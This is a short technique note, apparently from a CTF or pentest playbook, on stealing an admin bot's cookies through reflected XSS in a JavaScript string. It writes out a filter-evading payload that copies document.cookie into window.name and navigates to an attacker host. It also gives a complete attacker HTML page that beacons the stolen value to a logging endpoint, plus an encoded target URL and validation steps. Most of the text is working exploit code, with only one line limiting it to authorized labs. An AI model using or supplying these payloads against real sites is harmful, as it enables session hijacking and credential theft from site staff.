# `window.name` Admin Bot Exfil From JavaScript String Sink

## Context

Use when:

- input is reflected into inline JavaScript string context
- the target has a same-origin admin/support/review bot
- normal XSS characters are filtered
- an attacker-controlled host can serve a tiny HTML page and expose request logs

## Requirements

- Authorized lab, owned app, in-scope target, or defensive validation.
- Do not store live flags, secrets, cookies, or private hostnames in reusable files.

## Reflection Shape

Typical sink:

```javascript
var message = "PAYLOAD";
```

## Core Victim Payload

```text
";name=document.cookie;location='//[attacker-host]'//
```

## Why This Payload Is Useful

- avoids `+`
- avoids `?`
- avoids `:`
- avoids `()`
- avoids calling external APIs from the victim page

It works best when the filter still allows:

```text
" ' / ; = . letters digits
```

## Attacker Page

```html
<!doctype html><meta charset="utf-8"><title>x</title><body>loading<script>document.body.textContent=window.name||"empty";(new Image).src="/x?d="+encodeURIComponent(window.name||"empty")</script>
```

Expected requests:

```text
GET /
GET /x?d=<encoded window.name>
```

## Example Same-Origin Bot URL

```text
https://[target]/profile?message=%22%3Bname%3Ddocument.cookie%3Blocation%3D%27//[attacker-host]%27//
```

Adjust the path and parameter name for the real target.

## Why This Works

The victim page stores the sensitive cookie string in `window.name` before leaving the origin. In some runtimes, a top-level cross-origin navigation preserves `window.name`. The destination page can then read it and convert it into a logged request.

## Common Failure Modes

- The reflected sink is not JavaScript-string context.
- `"` is blocked, so the string cannot be terminated.
- `window.name` is cleared by the target browser/runtime.
- Sensitive cookies are `HttpOnly`.
- The attacker host is stale, misconfigured, or not yet propagated when the bot visits.

## Validation Order

1. Confirm reflection context.
2. Confirm bot accepts same-origin URL.
3. Confirm `window.name` survives a top-level cross-origin navigation in a comparable browser/runtime.
4. Use a fresh attacker host if propagation/cache behavior is uncertain.
5. Prefer same-site logging over third-party beacons when possible.
